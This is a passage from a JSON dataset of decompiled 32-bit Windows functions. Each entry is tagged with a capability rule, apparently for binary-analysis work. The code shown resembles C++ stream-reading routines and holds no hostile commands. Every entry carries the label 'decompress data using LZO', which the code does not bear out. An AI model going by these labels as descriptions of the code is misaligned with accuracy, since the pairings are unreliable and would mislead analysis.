puVar1 = extraout_ECX_02 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_02 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_02 + -0xc);\n        puVar1 = extraout_ECX_02 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_02 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_02;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.0049dc90();\n    if (var_1dh_7 == '\\0') {\n        return extraout_ECX_03;\n    }\n    piVar5 = *(extraout_ECX_03 + *(*extraout_ECX_03 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x14))();\n        return extraout_ECX_03;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_04 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_03;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.0049dc90();\n    if (var_1dh_8 == '\\0') {\n        return extraout_ECX_04;\n    }\n    piVar5 = *(extraout_ECX_04 + *(*extraout_ECX_04 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0xc))();\n        return extraout_ECX_04;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_05 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_04 + -0xc);\n        puVar1 = extraout_ECX_04 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_04 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_04 + -0xc);\n        puVar1 = extraout_ECX_04 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_04 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_04;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.0049dc90();\n    if (var_1dh_9 == '\\0') {\n        return extraout_ECX_05;\n    }\n    piVar5 = *(extraout_ECX_05 + *(*extraout_ECX_05 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x18))();\n        return extraout_ECX_05;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_06 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_05 + -0xc);\n        puVar1 = extraout_ECX_05 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_05 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_05 + -0xc);\n        puVar1 = extraout_ECX_05 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_05 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_05;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.0049dc90();\n    if (var_1dh_10 == '\\0') {\n        return extraout_ECX_06;\n    }\n    piVar5 = *(extraout_ECX_06 + *(*extraout_ECX_06 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x10))();\n        return extraout_ECX_06;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_07 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_06 + -0xc);\n        puVar1 = extraout_ECX_06 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_06 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_06 + -0xc);\n        puVar1 = extraout_ECX_06 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_06 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_06;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.0049dc90();\n    if (var_1dh_11 == '\\0') {\n        return extraout_ECX_07;\n    }\n    iStack852 = *(*extraout_ECX_07 + -0xc) + extraout_ECX_07;\n    if (*(iStack852 + 0x84) != NULL) {\n        (**(**(iStack852 + 0x84) + 0x1c))();\n        return extraout_ECX_07;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_08 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_07 + -0xc);\n        puVar1 = extraout_ECX_07 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_07 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_07 + -0xc);\n        puVar1 = extraout_ECX_07 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_07 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_07;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    uStack856 = fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.0049dc90(extraout_ECX_08, 0);\n    if (cStack873 == '\\0') {\n        return extraout_ECX_08;\n    }\n    uStack872 = 0;\n    iVar9 = *(*extraout_ECX_08 + -0xc) + extraout_ECX_08;\n    if (*(iVar9 + 0x84) != NULL) {\n        (**(**(iVar9 + 0x84) + 0x20))(*(iVar9 + 0x78), 0xffff, 0, 0xffff, iVar9, &stack0xfffffc98, 0x49c66e);\ncode_r0x0049c7e9:\n        if (uStack872 == 0) {\n            return extraout_ECX_08;\n        }\n        fcn.004bc500(uStack872 | *(extraout_ECX_08 + *(*extraout_ECX_08 + -0xc) + 0x14));\n        return extraout_ECX_08;\n    }\n    uVar10 = fcn.004bde60();\n    if (uVar10 >> 0x20 == 1) {\n        fcn.004c2e40(uVar10);\n        iVar9 = *(*extraout_ECX_08 + -0xc);\n        puVar1 = extraout_ECX_08 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_08 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        piVar5 = fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40(uVar10);\n        iVar9 = *(*extraout_ECX_08 + -0xc);\n        puVar1 = extraout_ECX_08 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_08 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            goto code_r0x0049c7e9;\n        }\n        fcn.004c32d0();\n        piVar5 = extraout_ECX_08;\n    }\n    fcn.004c2fb0();\n    uVar4 = fcn.0043a8e0(piVar5);\n    fcn.004c2fb0();\n    fcn.0043a8e0(uVar4);\n    piVar5 = *(extraout_ECX_09 + *(*extraout_ECX_09 + -0xc) + 0x7c);\n    if (piVar5 != NULL) {\n        uVar2 = (**(*piVar5 + 0x28))(10);\n        piVar5 = fcn.0049c8e0(uVar4, 0x49c78e, uVar2);\n        return piVar5;\n    }\n    fcn.004bde60();\n    extraout_ECX_10[1] = 0;\n    fcn.0049dc90(extraout_ECX_10, 1);\n    if (cStack989 == '\\0') {\n        iVar8 = extraout_ECX_10[1];\n    }\n    else {\n        piVar5 = *(extraout_ECX_10 + *(*extraout_ECX_10 + -0xc) + 0x78);\n        piVar6 = piVar5[2];\n        if (piVar6 <= piVar5[3] && piVar5[3] != piVar6) goto code_r0x0049c9a7;\ncode_r0x0049c951:\n        iVar3 = (**(*piVar5 + 0x24))();\n        iVar8 = extraout_ECX_10[1];\n        iVar9 = iVar8 + 1;\n        piVar6 = in_stack_fffffc4c;\n        if (iVar9 < in_stack_fffffc48) {\n            do {\n                if (iVar3 == -1) {\n                    uVar7 = 2;\ncode_r0x0049ca92:\n                    if (0 < in_stack_fffffc48) {\n                        *piVar6 = 0;\n                    }\n                    if (iVar8 == 0) {\ncode_r0x0049ca0d:\n                        uVar7 = uVar7 | 4;\n                    }\n                    else if (uVar7 == 0) {\n                        return extraout_ECX_10;\n                    }\n                    goto code_r0x0049ca65;\n                }\n                if (iVar3 == var_ch_12) {\n                    uVar7 = 0;\n                    goto code_r0x0049ca92;\n                }\n                in_stack_fffffc4c = piVar6 + 1;\n                *piVar6 = iVar3;\n                extraout_ECX_10[1] = iVar9;\n                piVar6 = piVar5[2];\n                if (piVar6 < piVar5[3]) {\n                    iVar3 = *piVar6;\n                    piVar5[2] = piVar6 + 1;\n                    if (iVar3 != -1) goto code_r0x0049c99f;\ncode_r0x0049c9f0:\n                    iVar9 = extraout_ECX_10[1];\n                    if (in_stack_fffffc48 < 1) {\n                        if (iVar9 != 0) goto code_r0x0049c983;\n                        uVar7 = 6;\n                    }\n                    else {\n                        *in_stack_fffffc4c = 0;\n                        uVar7 = 2;\n                        if (iVar9 == 0) goto code_r0x0049ca0d;\n                    }\n                    goto code_r0x0049ca65;\n                }\n                iVar3 = (**(*piVar5 + 0x28))();\n                if (iVar3 == -1) goto code_r0x0049c9f0;\ncode_r0x0049c99f:\n                piVar6 = piVar5[2];\n                if (piVar5[3] <= piVar6) goto code_r0x0049c951;\ncode_r0x0049c9a7:\n                iVar8 = extraout_ECX_10[1];\n                iVar3 = *piVar6;\n                iVar9 = iVar8 + 1;\n                piVar6 = in_stack_fffffc4c;\n                if (in_stack_fffffc48 <= iVar9) break;\n            } while( true );\n        }\n        if (iVar3 == -1) {\n            if (0 < in_stack_fffffc48) {\n                *in_stack_fffffc4c = 0;\n            }\n            uVar7 = 6;\n            if (iVar8 != 0) {\ncode_r0x0049c983:\n                uVar7 = 2;\n            }\n            goto code_r0x0049ca65;\n        }\n    }\n    if (0 < in_stack_fffffc48) {\n        *in_stack_fffffc4c = 0;\n    }\n    if (iVar8 != 0) {\n        return extraout_ECX_10;\n    }\n    uVar7 = 4;\ncode_r0x0049ca65:\n    fcn.004bc500(uVar7 | *(extraout_ECX_10 + *(*extraout_ECX_10 + -0xc) + 0x14));\n    return extraout_ECX_10;\n}\n",
        "token_count": 6515
    },
    "0049cb80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0049cb80(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int16_t *piVar2;\n    int16_t iVar3;\n    uint32_t uVar4;\n    int32_t *in_ECX;\n    uint var_30h;\n    uint var_2ah;\n    uint var_19h;\n    uint var_ch;\n    \n    in_ECX[1] = 0;\n    fcn.0049dc90();\n    if (var_19h == '\\0') {\ncode_r0x0049cc51:\n        if (in_ECX[1] != 0) {\n            return;\n        }\n        uVar4 = 4;\n    }\n    else {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        piVar2 = piVar1[2];\n        if (piVar1[3] < piVar2 || piVar1[3] == piVar2) {\n            iVar3 = (**(*piVar1 + 0x24))();\n        }\n        else {\n            iVar3 = *piVar2;\n        }\n        while (iVar3 != -1) {\n            if (iVar3 == arg_ch) goto code_r0x0049cc51;\n            piVar2 = arg_8h[5];\n            if (piVar2 < arg_8h[6]) {\n                *piVar2 = iVar3;\n                arg_8h[5] = piVar2 + 1;\n            }\n            else {\n                iVar3 = (**(*arg_8h + 0x34))(iVar3);\n                if (iVar3 == -1) goto code_r0x0049cc51;\n            }\n            in_ECX[1] = in_ECX[1] + 1;\n            piVar2 = piVar1[2];\n            if (piVar2 < piVar1[3]) {\n                iVar3 = *piVar2;\n                piVar1[2] = piVar2 + 1;\n            }\n            else {\n                iVar3 = (**(*piVar1 + 0x28))();\n            }\n            if (iVar3 == -1) break;\n            if (piVar1[2] < piVar1[3]) {\n                iVar3 = *piVar1[2];\n            }\n            else {\n                iVar3 = (**(*piVar1 + 0x24))();\n            }\n        }\n        uVar4 = (-(in_ECX[1] == 0) & 4) + 2;\n    }\n    fcn.004bc500(uVar4 | *(in_ECX + *(*in_ECX + -0xc) + 0x14));\n    return;\n}\n",
        "token_count": 627
    },
    "0049d060": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0049d060(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    in_ECX[1] = 0;\n    fcn.0049dc90();\n    if (var_9h != '\\0') {\n        iVar1 = (**(**(in_ECX + *(*in_ECX + -0xc) + 0x78) + 0x20))(arg_8h, arg_ch);\n        in_ECX[1] = iVar1;\n        if (arg_ch != iVar1) {\n            fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 6);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 218
    },
    "0049d2c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0049d2c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_39h;\n    uint32_t var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 0xfffffffd);\n    fcn.0049dc90();\n    if ((var_39h != '\\0') && ((*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 5) == 0)) {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        (**(*piVar1 + 0x14))(piVar1, arg_8h, arg_ch, arg_10h, arg_14h, 8);\n        if ((var_34h & stack0xffffffc4) == 0xffffffff) {\n            fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 363
    },
    "0049d410": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0049d410(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint32_t var_29h;\n    uint32_t var_24h;\n    uint var_ch;\n    \n    fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 0xfffffffd);\n    fcn.0049dc90();\n    if ((var_29h != '\\0') && ((*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 5) == 0)) {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        (**(*piVar1 + 0x10))(piVar1, arg_8h, arg_ch, arg_10h, 8);\n        if ((var_24h & stack0xffffffd4) == 0xffffffff) {\n            fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "0049d630": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __fastcall fcn.0049d630(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    param_1[1] = 0;\n    fcn.004bc500(*(param_1 + *(*param_1 + -0xc) + 0x14) & 0xfffffffd);\n    fcn.0049dc90(param_1, 1);\n    if (var_9h == '\\0') {\n        return param_1;\n    }\n    iVar4 = *(*param_1 + -0xc) + param_1;\n    piVar1 = *(iVar4 + 0x78);\n    if (piVar1 != NULL) {\n        uVar2 = piVar1[2];\n        if (piVar1[1] < uVar2) {\n            piVar1[2] = uVar2 - 2;\n            iVar3 = *(uVar2 - 2);\n        }\n        else {\n            iVar3 = (**(*piVar1 + 0x2c))(0xffff);\n        }\n        if (iVar3 != -1) {\n            return param_1;\n        }\n        iVar4 = *(*param_1 + -0xc) + param_1;\n    }\n    fcn.004bc500(*(iVar4 + 0x14) | 1);\n    return param_1;\n}\n",
        "token_count": 362
    },
    "0049dc90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0049e08a: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0049e08f)\n\nint32_t * __thiscall fcn.0049dc90(int32_t *param_1, int32_t *param_2, char param_3)\n\n{\n    uint32_t *puVar1;\n    int16_t *piVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    char cVar5;\n    int16_t iVar6;\n    uint16_t uVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    uint uVar10;\n    int32_t iVar11;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t iVar12;\n    int32_t *piVar13;\n    int32_t *piVar14;\n    int32_t *piVar15;\n    ulong uVar16;\n    int32_t *piStack216;\n    int32_t *piStack212;\n    int32_t *piStack208;\n    int16_t iStack204;\n    char cStack185;\n    int16_t *piStack152;\n    int32_t in_stack_ffffff6c;\n    int16_t iStack136;\n    uchar *puStack64;\n    int32_t *piStack60;\n    int32_t *piStack56;\n    char cStack52;\n    int32_t *piStack32;\n    \n    *param_1 = 0;\n    iVar11 = *(*param_2 + -0xc) + param_2;\n    uVar8 = *(iVar11 + 0x14);\n    piStack32 = param_1;\n    if (uVar8 != 0) goto code_r0x0049dd7d;\n    if (*(iVar11 + 0x70) != 0) {\n        puStack64 = 0x49dcc9;\n        fcn.0049f0c0();\n        iVar11 = *(*param_2 + -0xc) + param_2;\n        if ((param_3 == '\\0') && ((*(iVar11 + 0xd) & 0x10) != 0)) goto code_r0x0049dce2;\ncode_r0x0049dde7:\n        uVar8 = *(iVar11 + 0x14);\n        if (uVar8 == 0) {\n            *piStack32 = 1;\n            return piStack32;\n        }\ncode_r0x0049dd7d:\n        piStack60 = uVar8 | 4;\n        puStack64 = 0x49dd88;\n        piVar9 = fcn.004bc500();\n        return piVar9;\n    }\n    if ((param_3 != '\\0') || ((*(iVar11 + 0xd) & 0x10) == 0)) {\n        *param_1 = 1;\n        return param_1;\n    }\ncode_r0x0049dce2:\n    piVar9 = *(iVar11 + 0x78);\n    if (piVar9[2] < piVar9[3]) {\n        uVar7 = *piVar9[2];\n    }\n    else {\n        puStack64 = 0x49de17;\n        uVar7 = (**(*piVar9 + 0x24))();\n        iVar11 = *(*param_2 + -0xc) + param_2;\n    }\n    piVar14 = *(iVar11 + 0x7c);\n    if (piVar14 != NULL) {\n        if (uVar7 != 0xffff) {\n            do {\n                piStack56 = uVar7;\n                piStack60 = 0x20;\n                puStack64 = 0x49dd49;\n                cVar5 = (**(*piVar14 + 8))();\n                if (cVar5 == '\\0') goto code_r0x0049dde0;\n                piVar2 = piVar9[2];\n                if (piVar2 < piVar9[3]) {\n                    iVar6 = *piVar2;\n                    piVar9[2] = piVar2 + 1;\n                }\n                else {\n                    puStack64 = 0x49dd63;\n                    iVar6 = (**(*piVar9 + 0x28))();\n                }\n                if (iVar6 == -1) break;\n                if (piVar9[2] < piVar9[3]) {\n                    uVar7 = *piVar9[2];\n                }\n                else {\n                    puStack64 = 0x49de07;\n                    uVar7 = (**(*piVar9 + 0x24))();\n                }\n            } while (uVar7 != 0xffff);\n            iVar11 = param_2 + *(*param_2 + -0xc);\n        }\n        uVar8 = *(iVar11 + 0x14) | 2;\n        goto code_r0x0049dd7d;\n    }\n    puStack64 = 0x49de28;\n    uVar16 = fcn.004bde60();\n    piStack60 = uVar16;\n    if (uVar16 >> 0x20 == 1) {\n        puStack64 = 0x49de2f;\n        fcn.004c2e40();\n        iVar11 = *(*param_2 + -0xc);\n        puVar1 = param_2 + iVar11 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_2 + iVar11 + 0x10) & 1) != 0) {\n            puStack64 = 0x49de43;\n            fcn.004c32d0();\n        }\n        puStack64 = 0x49de48;\n        piVar9 = fcn.004c32d0();\n    }\n    else {\n        puStack64 = 0x49ddc0;\n        fcn.004c2e40();\n        iVar11 = *(*param_2 + -0xc);\n        puVar1 = param_2 + iVar11 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_2 + iVar11 + 0x10) & 1) == 0) {\n            puStack64 = 0x49ddd6;\n            fcn.004c2fb0();\ncode_r0x0049dde0:\n            iVar11 = param_2 + *(*param_2 + -0xc);\n            goto code_r0x0049dde7;\n        }\n        puStack64 = 0x49de51;\n        fcn.004c32d0();\n    }\n    puStack64 = 0x49de56;\n    fcn.004c2fb0();\n    puStack64 = 0x49de5e;\n    piStack60 = piVar9;\n    uVar10 = fcn.0043a8e0();\n    puStack64 = 0x49de65;\n    fcn.004c2fb0();\n    puStack64 = 0x49de6d;\n    piStack60 = uVar10;\n    fcn.0043a8e0();\n    piStack152 = &stack0xffffffc0;\n    *extraout_ECX = 0;\n    iVar11 = *(*piStack56 + -0xc) + piStack56;\n    uVar8 = *(iVar11 + 0x14);\n    puStack64 = &stack0xfffffffc;\n    if (uVar8 != 0) goto code_r0x0049df5d;\n    if (*(iVar11 + 0x70) != 0) {\n        puStack64 = &stack0xfffffffc;\n        fcn.0049f0c0();\n        iVar11 = *(*piStack56 + -0xc) + piStack56;\n        if ((cStack52 == '\\0') && ((*(iVar11 + 0xd) & 0x10) != 0)) goto code_r0x0049dec2;\ncode_r0x0049dfc7:\n        uVar8 = *(iVar11 + 0x14);\n        if (uVar8 == 0) {\n            *extraout_ECX = 1;\n            return extraout_ECX;\n        }\ncode_r0x0049df5d:\n        piVar9 = fcn.004bc500(uVar8 | 4);\n        return piVar9;\n    }\n    if ((cStack52 != '\\0') || (puStack64 = &stack0xfffffffc,  (*(iVar11 + 0xd) & 0x10) == 0)) {\n        *extraout_ECX = 1;\n        return extraout_ECX;\n    }\ncode_r0x0049dec2:\n    piVar9 = *(iVar11 + 0x78);\n    if (piVar9[2] < piVar9[3]) {\n        iVar6 = *piVar9[2];\n    }\n    else {\n        iVar6 = (**(*piVar9 + 0x24))();\n        iVar11 = *(*piStack56 + -0xc) + piStack56;\n    }\n    piVar14 = *(iVar11 + 0x7c);\n    if (piVar14 != NULL) {\n        if (iVar6 != -1) {\n            do {\n                cVar5 = (**(*piVar14 + 8))(0x20, iVar6);\n                if (cVar5 == '\\0') goto code_r0x0049dfc0;\n                piVar2 = piVar9[2];\n                if (piVar2 < piVar9[3]) {\n                    iVar6 = *piVar2;\n                    piVar9[2] = piVar2 + 1;\n                }\n                else {\n                    iVar6 = (**(*piVar9 + 0x28))();\n                }\n                if (iVar6 == -1) break;\n                if (piVar9[2] < piVar9[3]) {\n                    iVar6 = *piVar9[2];\n                }\n                else {\n                    iVar6 = (**(*piVar9 + 0x24))();\n                }\n            } while (iVar6 != -1);\n            iVar11 = piStack56 + *(*piStack56 + -0xc);\n        }\n        uVar8 = *(iVar11 + 0x14) | 2;\n        goto code_r0x0049df5d;\n    }\n    uVar16 = fcn.004bde60();\n    if (uVar16 >> 0x20 == 1) {\n        fcn.004c2e40(uVar16);\n        iVar11 = *(*piStack56 + -0xc);\n        puVar1 = piStack56 + iVar11 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(piStack56 + iVar11 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        piVar9 = fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40(uVar16);\n        iVar11 = *(*piStack56 + -0xc);\n        puVar1 = piStack56 + iVar11 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(piStack56 + iVar11 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\ncode_r0x0049dfc0:\n            iVar11 = piStack56 + *(*piStack56 + -0xc);\n            goto code_r0x0049dfc7;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    uVar10 = fcn.0043a8e0(piVar9);\n    fcn.004c2fb0();\n    fcn.0043a8e0(uVar10);\n    piVar9 = *(extraout_ECX_00 + *(*extraout_ECX_00 + -0xc) + 0x7c);\n    if (piVar9 == NULL) {\n        fcn.004bde60();\n        piVar9 = extraout_ECX_01;\n    }\n    else {\n        iStack136 = (**(*piVar9 + 0x28))(10);\n        in_stack_ffffff6c = 0x49e08f;\n        piVar9 = extraout_ECX_00;\n    }\n    piVar9[1] = 0;\n    fcn.0049dc90(piVar9, 1);\n    if (cStack185 == '\\0') {\n        iVar11 = piVar9[1];\n        if (0 < in_stack_ffffff6c) {\n    // WARNING: Ignoring partial resolution of indirect\n            puStack64._0_2_ = 0;\n        }\njoined_r0x0049e384:\n        if (iVar11 != 0) {\n            return piStack208;\n        }\n        uVar8 = 4;\n    }\n    else {\n        piVar9 = *(piStack208 + *(*piStack208 + -0xc) + 0x78);\n        piVar2 = piVar9[2];\n        if (piVar9[3] < piVar2 || piVar9[3] == piVar2) {\n            iVar6 = (**(*piVar9 + 0x24))();\n        }\n        else {\n            iVar6 = *piVar2;\n            piStack152 = &stack0xffffffc0;\n        }\ncode_r0x0049e17f:\n        iVar12 = piStack208[1];\n        while (iVar11 = iVar12 + 1,  iVar11 < in_stack_ffffff6c) {\n            while( true ) {\n                if (iVar6 == -1) goto code_r0x0049e2ec;\n                piStack216 = piVar9[3];\n                piVar14 = piVar9[2];\n                if (iVar6 == iStack136) goto code_r0x0049e12e;\n                piStack212 = (in_stack_ffffff6c - iVar12) + -1;\n                piVar15 = piStack216 - piVar14 >> 1;\n                if (piStack212 <= piVar15) {\n                    piVar15 = piStack212;\n                }\n                piVar3 = piVar14;\n                piVar13 = piVar15;\n                piVar4 = piVar14;\n                if (piVar15 < 2) break;\n                while (piStack212 = piVar15,  piVar4 != NULL) {\n                    if (*piVar3 == iStack136) {\n                        iVar11 = piVar3 - piVar14;\n                        piStack212 = iVar11 >> 1;\n                        if (piStack212 == NULL) goto code_r0x0049e21c;\n                        break;\n                    }\n                    piVar13 = piVar13 + -1;\n                    piVar3 = piVar3 + 2;\n                    piVar4 = piVar13;\n                }\n                iVar11 = piStack212 * 2;\n                sub.msvcrt.dll_memcpy(piStack152, piVar14, iVar11);\n                piVar14 = piVar9[2];\n                iVar12 = piStack208[1];\n                piStack216 = piVar9[3];\ncode_r0x0049e21c:\n                piStack152 = piStack152 + iVar11;\n                iVar12 = iVar12 + piStack212;\n                piVar14 = iVar11 + piVar14;\n                piVar9[2] = piVar14;\n                piStack208[1] = iVar12;\n                if (piStack216 <= piVar14) {\n                    iVar6 = (**(*piVar9 + 0x24))();\n                    goto code_r0x0049e17f;\n                }\n                iVar6 = *piVar14;\n                iVar11 = iVar12 + 1;\n                if (in_stack_ffffff6c <= iVar11) goto code_r0x0049e248;\n            }\n            *piStack152 = iVar6;\n            piStack152 = piStack152 + 1;\n            piStack208[1] = iVar11;\n            if (piVar14 < piStack216) {\n                iVar6 = *piVar14;\n                piVar9[2] = piVar14 + 2;\n            }\n            else {\n                iVar6 = (**(*piVar9 + 0x28))();\n            }\n            if (iVar6 == -1) {\n                iVar12 = piStack208[1];\ncode_r0x0049e2ec:\n                uVar8 = 2;\n                if (0 < in_stack_ffffff6c) {\n                    *piStack152 = 0;\n                }\n                goto code_r0x0049e302;\n            }\n            if (piVar9[2] < piVar9[3]) {\n                iVar6 = *piVar9[2];\n                iVar12 = piStack208[1];\n            }\n            else {\n                iVar6 = (**(*piVar9 + 0x24))();\n                iVar12 = piStack208[1];\n            }\n        }\ncode_r0x0049e248:\n        if (iVar6 == -1) {\n            if (0 < in_stack_ffffff6c) {\n                *piStack152 = 0;\n                uVar8 = (-(iVar12 == 0) & 4) + 2;\n                goto code_r0x0049e0fd;\n            }\n            uVar8 = 2;\n        }\n        else {\n            if (iVar6 == iStack204) {\n                piStack216 = piVar9[3];\n                piVar14 = piVar9[2];\ncode_r0x0049e12e:\n                piStack208[1] = 